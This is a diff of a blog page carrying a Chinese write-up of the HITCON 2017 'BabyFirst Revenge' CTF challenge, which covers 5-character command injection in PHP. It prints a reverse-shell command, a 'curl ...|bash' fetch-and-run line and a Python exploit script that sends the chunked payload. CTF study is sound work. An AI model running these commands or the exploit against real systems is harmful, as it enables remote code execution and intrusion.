@@ -19,19 +19,6 @@
           <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
           <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
         <![endif]-->
-
-    <script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-    ga('create', 'UA-87275583-1', 'auto');
-    ga('send', 'pageview');
-
-</script>
-
-
     <link rel="shortcut icon" href="/assets/images/favicon.png">
 
     <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
@@ -96,17 +83,24 @@
         
         •
         <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#hitcon" class="reserved">hitcon</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
+        
+          <span id="/posts/hitcon2017-BabyFirst-Revenge%E5%A4%8D%E7%8E%B0/" class="leancloud_visitors" data-flag-title="[hitcon2017] BabyFirst Revenge复现">
+            Page view:
+            <span class="leancloud-visitors-count"></span>
+          </span>
+        
     </p>
   </header>
 
   <article class="post-content">
-  <p>hitcon的题好难啊！！！！！<br>
-还是太菜了。。Orz<br>
-只能够赛后搭环境复现了。。<br>
-分享本题自制Dockerfile：<a href="https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge">Github</a> </p>
+  <p>hitcon的题好难啊！！！！！
+还是太菜了。。Orz
+只能够赛后搭环境复现了。。
+分享本题自制Dockerfile：<a href="https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge">Github</a></p>
 
 <p>这题是一个特别的命令执行题， 首先进去首页之后发现以下源码</p>
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
     <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/www/sandbox/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
     <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
     <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
@@ -116,56 +110,79 @@
         <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">'/bin/rm -rf '</span> <span class="o">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
-</code></pre></div>
-<hr>
+</code></pre></div></div>
+
+<hr />
 
 <p>无论我们传什么进去他都会照单执行，但是每次的长度限制为最多5个字符，正常来说最短(?)的写shell方式应该是</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo </span>x&gt;&gt;1
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>x&gt;&gt;1
 ....
 sh 1
-</code></pre></div>
+</code></pre></div></div>
+
 <p>但是其实我们可以利用ls来写shell，如下：</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">&gt;</span>a
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>a
 <span class="nb">ls</span><span class="o">&gt;</span>_
 sh _  <span class="c">#也就执行了a指令 但是没有意义，所以我们就要构造一系列的指令出来追加到文件里</span>
-</code></pre></div>
-<p>那么这里就涉及到几个问题：<br>
-1. ls出来是按照什么顺序排列的文件？<br>
-2. 追加文件的时候会自动加入换行 这个问题要怎么解决？<br>
-3. 如果ls途中有无用的文件怎么办？ 因为如果是以上的做法的话其实<code class="prettyprint">cat _</code>你会发现里面还有一个<code class="prettyprint">_</code>文件</p>
+</code></pre></div></div>
+
+<p>那么这里就涉及到几个问题：</p>
+<ol>
+  <li>ls出来是按照什么顺序排列的文件？</li>
+  <li>追加文件的时候会自动加入换行 这个问题要怎么解决？</li>
+  <li>如果ls途中有无用的文件怎么办？ 因为如果是以上的做法的话其实<code class="highlighter-rouge">cat _</code>你会发现里面还有一个<code class="highlighter-rouge">_</code>文件</li>
+</ol>
 
 <blockquote>
-<p>答案：<br>
-1. ls -l的默认排序方式手册上写了是alphabetically（字典序）也就是说有可能后面加入的文件名排在前面，为了避免这个问题我们可以加入-t参数来使ls之后的结果按照最近修改的文件在前面的方式排列<br>
-2. linux的命令执行中支持命令换行 需要用到反斜杠\ 写到最后面，如：<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-%E5%A4%8D%E7%8E%B0/1.png" alt="🌰"><br>
-3. 其实bash在执行脚本的时候遇到未知的命令会报错 但是这并不会使之退出，bash会继续执行下一行的命令，如图<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-%E5%A4%8D%E7%8E%B0/2.png" alt="🌰"></p>
+  <p>答案：</p>
+  <ol>
+    <li>ls -l的默认排序方式手册上写了是alphabetically（字典序）也就是说有可能后面加入的文件名排在前面，为了避免这个问题我们可以加入-t参数来使ls之后的结果按照最近修改的文件在前面的方式排列</li>
+    <li>linux的命令执行中支持命令换行 需要用到反斜杠\ 写到最后面，如：<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-复现/1.png" alt="🌰" /></li>
+    <li>其实bash在执行脚本的时候遇到未知的命令会报错 但是这并不会使之退出，bash会继续执行下一行的命令，如图<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-复现/2.png" alt="🌰" /></li>
+  </ol>
 </blockquote>
 
 <p>那到这里思路其实已经挺清晰的了, 就是通过写入一系列指令的分段，并用反斜杠\作为文件结尾，最后执行ls -t&gt;g并且sh g来执行我们想要的指令，这里以执行反弹shell为例：</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">curl 10.188.2.20|bash
-</code></pre></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 10.188.2.20|bash
+</code></pre></div></div>
+
 <p>我的10.188.2.20/index.html文件内容为:</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.188.2.20/12345 0&gt;&amp;1
-</code></pre></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.188.2.20/12345 0&gt;&amp;1
+</code></pre></div></div>
+
 <ul>
-<li>写入 ls -t&gt;g指令到_文件</li>
+  <li>写入 ls -t&gt;g指令到_文件</li>
 </ul>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">?cmd<span class="o">=&gt;</span><span class="nb">ls</span><span class="se">\\</span>    <span class="c">#创建ls\</span>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?cmd<span class="o">=&gt;</span><span class="nb">ls</span><span class="se">\\</span>    <span class="c">#创建ls\</span>
 ?cmd<span class="o">=</span><span class="nb">ls</span><span class="o">&gt;</span>_    <span class="c">#创建 _ 文件 文件内容为_ \n ls\ \n</span>
 ?cmd<span class="o">=&gt;</span><span class="se">\ \\</span>    <span class="c">#创建 \空格 文件</span>
 ?cmd<span class="o">=&gt;</span><span class="nt">-t</span><span class="se">\\</span>    <span class="c">#创建 -t\ 文件</span>
 ?cmd<span class="o">=&gt;</span><span class="se">\&gt;</span>g    <span class="c">#创建 &gt;g 文件</span>
 ?cmd<span class="o">=</span><span class="nb">ls</span><span class="o">&gt;&gt;</span>_   <span class="c">#将刚刚创建的文件名按照字典序写入_文件 这里的字典序是特殊符号在ls\的前面 所以在生成ls\之后我们要先ls&gt;_ 保证ls\在最前面</span>
-</code></pre></div>
-<p>最后生成的_文件结果如图：<br>
-<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-%E5%A4%8D%E7%8E%B0/3.png" alt="_ 文件"></p>
+</code></pre></div></div>
+
+<p>最后生成的_文件结果如图：
+<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-复现/3.png" alt="_ 文件" /></p>
 
 <p>最后我们需要生成我们自己的命令的时候直接sh _就可以在g文件里面生成我们想要的命令了 然后再sh g就可以rce了</p>
 
-<p>比如我要执行 curl 10.188.2.20|bash (index.html已经提前放好反弹shell的命令)</p>
+<table>
+  <tbody>
+    <tr>
+      <td>比如我要执行 curl 10.188.2.20</td>
+      <td>bash (index.html已经提前放好反弹shell的命令)</td>
+    </tr>
+  </tbody>
+</table>
 
 <p>因为这是按照时间倒叙ls 所以我要倒着生成我要执行的指令文件，比如orange大大的exp：</p>
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
 <span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>
 
@@ -173,23 +190,23 @@ sh _  <span class="c">#也就执行了a指令 但是没有意义，所以我们�
     <span class="c1"># generate `ls -t&gt;g` file
 </span>    <span class="s">'&gt;ls</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'ls&gt;_'</span><span class="p">,</span> 
-    <span class="s">'&gt;</span><span class="err">\</span><span class="s"> </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
+    <span class="s">'&gt;\ </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'&gt;-t</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;</span><span class="err">\</span><span class="s">&gt;g'</span><span class="p">,</span> 
+    <span class="s">'&gt;\&gt;g'</span><span class="p">,</span> 
     <span class="s">'ls&gt;&gt;_'</span><span class="p">,</span> 
 
     <span class="c1"># generate `curl orange.tw.tw|python`
 </span>    <span class="c1"># generate `curl 10.188.2.20|bash` 
-</span>    <span class="s">'&gt;sh</span><span class="err">\</span><span class="s"> '</span><span class="p">,</span> 
+</span>    <span class="s">'&gt;sh\ '</span><span class="p">,</span> 
     <span class="s">'&gt;ba</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;</span><span class="err">\</span><span class="s">|</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
+    <span class="s">'&gt;\|</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
     <span class="s">'&gt;20</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
     <span class="s">'&gt;2.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'&gt;8.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
     <span class="s">'&gt;18</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'&gt;0.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'&gt;1</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;</span><span class="err">\</span><span class="s"> </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
+    <span class="s">'&gt;\ </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'&gt;rl</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
     <span class="s">'&gt;cu</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
 
@@ -200,20 +217,21 @@ sh _  <span class="c">#也就执行了a指令 但是没有意义，所以我们�
 
 
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:22460/?reset=1'</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:22460/?reset=1'</span><span class="p">)</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
     <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">5</span> 
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:22460/?cmd='</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:22460/?cmd='</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
     <span class="k">print</span> <span class="n">i</span>
     <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
-</code></pre></div>
+</code></pre></div></div>
+
 <p>在生成自己的命令时要注意各个命令段之间名字不能相同 因为不能生成两个带有相同命令段的文件名</p>
 
-<p>//偷懒偷了好久才复现的。。Orz。。。。批评一下自己的懒惰。。<br>
+<p>//偷懒偷了好久才复现的。。Orz。。。。批评一下自己的懒惰。。
 各位大佬有啥更好的思路欢迎分享</p>
 
-<p>参考:<br>
-<a href="https://github.com/orangetw/My-CTF-Web-Challenges">https://github.com/orangetw/My-CTF-Web-Challenges</a></p>
+<p>参考:
+https://github.com/orangetw/My-CTF-Web-Challenges</p>
 
   </article>
 
@@ -268,6 +286,201 @@ $(document).ready(function() {
     });
 });
 </script>
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-87275583-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  <script src="https://code.jquery.com/jquery-3.2.0.min.js"></script>
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>
+    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
+    AV.useAVCloudUS();
+    //新增访问次数
+    function addCount(Counter) {
+      // 页面（博客文章）中的信息：leancloud_visitors
+      // id为page.url， data-flag-title为page.title
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      // 只根据文章的url查询LeanCloud服务器中的数据
+      query.equalTo("post_url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("visited_times");// 将点击次数加1
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                var newTimes = counter.get('visited_times');
+                $element.find('.leancloud-visitors-count').text(newTimes);
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            // 执行这里，说明LeanCloud中还没有记录此文章
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("post_title", title);// 把文章标题
+            newcounter.set("post_url", url); // 文章url
+            newcounter.set("visited_times", 1); // 初始点击次数：1次
+            newcounter.save(null, { // 上传到LeanCloud服务器中
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                var newTimes = newcounter.get('visited_times');
+                $element.find('.leancloud-visitors-count').text(newTimes);
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    //仅根据url和title查出当前访问次数，不做+1操作
+    function showCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      // 只根据文章的url查询LeanCloud服务器中的数据
+      query.equalTo("post_url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
+            var counter = results[0];
+            var $element = $(document.getElementById(url));
+            var newTimes = counter.get('visited_times');
+            $element.find('.leancloud-visitors-count').text(newTimes);
+          } else {
+            //如果表里没查到记录，那就是异常情况了
+            console.log('异常情况，不应该没记录的');
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    //调用API获取IP
+    function getVisitorIpAndJudge() {
+      var ip;
+      var options = {
+        type: 'GET',
+        url: "https://ctf.pr0ph3t.com/"
+      };
+      $.ajax(options)
+      .done(function(data, textStatus, jqXHR) {
+        if(textStatus == "success") {
+          ip = data.trim().split('<br>')[0];
+        }
+        judgeVisitor(ip)
+      });
+    }
+
+    //判断访客是否已访问过该文章，及访问时间，符合条件则增加一次访问次数
+    function judgeVisitor(ip) {
+      var Counter = AV.Object.extend("visited_times");
+      var Visitor = AV.Object.extend("visitors_record");
+
+      var $postInfo = $(".leancloud_visitors");
+      var post_url = $postInfo.attr('id').trim();
+
+      var query = new AV.Query(Visitor);
+
+      query.equalTo("visitor_ip", ip);
+      query.equalTo("post_url", post_url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            console.log('该IP已访问过该文章');
+
+            var oldVisitor = results[0];
+
+            var lastTime = oldVisitor.updatedAt;
+            var curTime = new Date();
+
+            var timePassed = curTime.getTime() - lastTime.getTime();
+
+            if(timePassed > 1 * 60 * 1000) {
+              console.log('距离该IP上一次访问该文章已超过了1分钟，更新访问记录，并增加访问次数');
+
+              addCount(Counter);
+
+              oldVisitor.fetchWhenSave(true);
+              oldVisitor.save(null, {
+                success: function(oldVisitor) { },
+                error: function(oldVisitor, error) {
+                  console.log('Failed to save visitor record, with error message: ' + error.message);
+                }
+              });
+            } else {
+              console.log('这是该IP 1分钟内重复访问该文章，不更新访问记录，不增加访问次数');
+              showCount(Counter);
+            }
+          } else {
+            console.log('该IP第一次访问该文章，保存新的访问记录，并增加访问次数');
+
+            addCount(Counter);
+
+            var newVisitor = new Visitor();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newVisitor.setACL(acl);
+            newVisitor.set("visitor_ip", ip);
+            newVisitor.set("post_url", post_url);
+            newVisitor.save(null, { // 上传到LeanCloud服务器中
+              success: function(newVisitor) { },
+              error: function(newVisitor, error) {
+                console.log('Failed to create visitor record, with error message: ' + error.message);
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+          addCount(Counter);
+        }
+      });
+    }
+
+    $(function() {
+      if ($('.leancloud_visitors').length == 1) {
+        // 文章页面，调用判断方法，对符合条件的访问增加访问次数
+        getVisitorIpAndJudge();
+      } else if ($('.post-link').length > 1){
+        // 首页 暂未使用
+        // showHitCount(Counter);
+      }
+    });
+  </script>
+
 <!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->
 
       </div>
